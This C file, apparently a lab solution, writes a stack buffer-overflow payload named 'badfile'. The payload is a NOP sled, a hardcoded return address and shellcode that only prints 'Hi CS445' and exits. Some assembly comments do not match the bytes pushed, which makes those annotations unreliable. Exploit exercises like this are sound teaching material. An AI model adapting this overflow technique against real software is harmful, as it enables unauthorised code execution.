/* exploit.c final */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
 "\x31\xC0" /* xor eax,eax */
 "\x50" /* push eax */
 "\x68""S445" /* push dword 0x646c726f */
 "\x68""Hi C" /* push dword 0x57206948 */
 "\x89\xE1" /* mov ecx,esp */
 "\xB0\x04" /* mov al,0x4 */
 "\x31\xDB" /* xor ebx,ebx */
 "\x43" /* inc ebx */
 "\x31\xD2" /* xor edx,edx */
 "\xB2\x08" /* mov dl,0x8 */
 "\xCD\x80" /* int 0x80 */
 "\xB0\x01" /* mov al,0x1 */
 "\x4B" /* dec ebx */
 "\xCD\x80" /* int 0x80 */
;

void main(int argc, char **argv)
{
  char buffer[400];
  FILE *badfile;

  /* A. Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 400);

  /* B. Fill the return address field with a candidate 
        entry point of the malicious code */
  *((long *) (buffer + 52)) = 0xbfffea8c + 0x60;
	
  // C. Place the shellcode towards the end of buffer
  memcpy(buffer + sizeof(buffer) - sizeof(shellcode), shellcode, 
         sizeof(shellcode));

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 400, 1, badfile);
  fclose(badfile);
}